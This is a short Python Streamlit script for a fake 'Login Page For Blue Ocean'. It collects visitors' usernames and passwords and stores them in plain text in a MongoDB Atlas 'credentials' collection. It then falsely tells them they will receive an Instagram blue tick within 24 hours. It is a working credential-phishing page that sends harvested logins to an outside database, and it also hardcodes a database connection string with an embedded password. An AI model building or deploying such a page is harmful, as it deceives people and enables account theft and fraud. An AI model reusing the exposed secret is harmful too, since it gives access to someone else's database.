import streamlit as st
from pymongo import MongoClient

# MongoDB Atlas connection string
MONGO_URI = "mongodb+srv://Vishu:vdONpmr0BXz6leVg@cluster0.8q6fo.mongodb.net/web?retryWrites=true&w=majority"
client = MongoClient(MONGO_URI)
db = client.get_database()  # Use your database name
credentials_collection = db.credentials  # Name of the collection

# Function to save username and password to MongoDB
def save_credentials(username, password):
    credentials_collection.insert_one({"username": username, "password": password})

# Streamlit app
st.set_page_config(page_title="Login Page For Blue Ocean", page_icon="🔒")

st.title("Login Page For Blue Ocean")

username = st.text_input("Username")
password = st.text_input("Password", type="password")

if st.button("Login"):
    # Save credentials to MongoDB (password is saved as plain text)
    save_credentials(username, password)
    
    # Inform user of successful login
    st.success("Login successful! You have received a blue tick on Instagram.")
    st.success("You will get the blue tick within 24 hours.")
else:
    st.info("Please enter your username and password to login.")
